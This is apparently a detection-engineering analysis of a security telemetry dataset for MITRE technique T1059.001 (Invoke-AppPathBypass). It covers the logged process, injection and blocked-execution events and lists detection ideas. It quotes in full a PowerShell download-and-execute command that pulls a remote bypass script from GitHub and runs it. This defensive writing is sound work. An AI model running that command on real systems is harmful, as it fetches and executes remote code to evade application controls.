# T1059.001-5: PowerShell — Invoke-AppPathBypass

## Technique Context

T1059.001 (PowerShell) is a fundamental execution technique where attackers leverage PowerShell's capabilities to execute malicious commands, scripts, or payloads. The "Invoke-AppPathBypass" variant specifically exploits Windows application execution paths to bypass application whitelisting or execution policies. This technique modifies registry keys related to application paths (typically under `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths`) to redirect legitimate application execution to attacker-controlled code.

Detection engineers focus on PowerShell script block logging, command-line arguments containing suspicious URLs or encoded commands, registry modifications to App Paths keys, and process injection behaviors that often accompany this technique. The community emphasizes monitoring for PowerShell downloading remote scripts, particularly those that manipulate registry entries or spawn unexpected child processes.

## What This Dataset Contains

The dataset captures a PowerShell execution that downloads and executes the Invoke-AppPathBypass script from GitHub. Key artifacts include:

**Command Execution**: Security event 4688 shows cmd.exe executing: `"cmd.exe" /c Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"`.

**Process Chain**: Sysmon captures the process relationships - PowerShell (PID 21120) spawning whoami.exe (PID 21404), along with the expected .NET runtime loading (mscoree.dll, clr.dll) and PowerShell automation modules.

**Process Injection Artifacts**: Sysmon event 10 shows PowerShell accessing whoami.exe with full access rights (0x1FFFFF), and event 8 captures CreateRemoteThread activity targeting an unknown process (PID 20364), indicating injection behaviors.

**Network Capability**: urlmon.dll loading in PowerShell processes indicates web client functionality for downloading the remote script.

**Failure Evidence**: The cmd.exe process exits with status 0xC0000022 (STATUS_ACCESS_DENIED), indicating Windows Defender blocked the technique execution.

## What This Dataset Does Not Contain

Crucially missing are the actual registry modifications that define this technique - no Sysmon event 13 (Registry value set) events appear in the data, suggesting Defender prevented the App Paths registry manipulation before it could occur. The PowerShell script block logs contain only test framework boilerplate (Set-StrictMode, error handling scriptlets) rather than the actual Invoke-AppPathBypass script content, likely because the download was blocked.

Network connection events (Sysmon event 3) are absent, indicating the web request to GitHub may have been blocked or filtered by the sysmon-modular configuration. The technique's core registry persistence mechanism isn't captured because the execution was interrupted by endpoint protection.

## Assessment

This dataset provides moderate value for detection engineering, primarily demonstrating attack attempt telemetry rather than successful execution. The Security 4688 events with full command-line logging offer excellent visibility into the attack vector - PowerShell downloading and executing remote scripts with clear IoCs (GitHub URLs, specific script names, suspicious parameters).

The Sysmon process injection events (8, 10) are valuable for behavioral detection, showing how this technique employs process manipulation even when the primary registry-based mechanism fails. However, the lack of registry modification events limits its utility for detecting the technique's core persistence mechanism. The dataset is strongest for building detections around the initial execution vector rather than the technique's intended outcome.

## Detection Opportunities Present in This Data

1. **Remote PowerShell Script Download**: Monitor Security 4688 for PowerShell command lines containing `IEX (New-Object Net.WebClient).DownloadString` with external URLs, particularly GitHub raw content URLs.

2. **Invoke-AppPathBypass Function Calls**: Detect command lines explicitly calling `Invoke-AppPathBypass` function with payload parameters pointing to system binaries.

3. **PowerShell Process Injection Behavior**: Correlate Sysmon events 8 and 10 where PowerShell processes perform CreateRemoteThread operations or access other processes with full rights (0x1FFFFF).

4. **Suspicious PowerShell Child Process**: Monitor for PowerShell spawning reconnaissance tools like whoami.exe in conjunction with process injection artifacts.

5. **Failed Execution with Access Denied**: Track cmd.exe processes exiting with 0xC0000022 status, especially when spawned by PowerShell with suspicious command lines, indicating blocked malicious activity.

6. **PowerShell Web Client Module Loading**: Detect urlmon.dll loading in PowerShell processes as an indicator of web download capability, particularly when correlated with suspicious command-line arguments.

7. **Endpoint Protection Blocking Pattern**: Establish baselines for Windows Defender blocking behaviors (specific exit codes, process termination timing) to identify attack attempts even when unsuccessful.
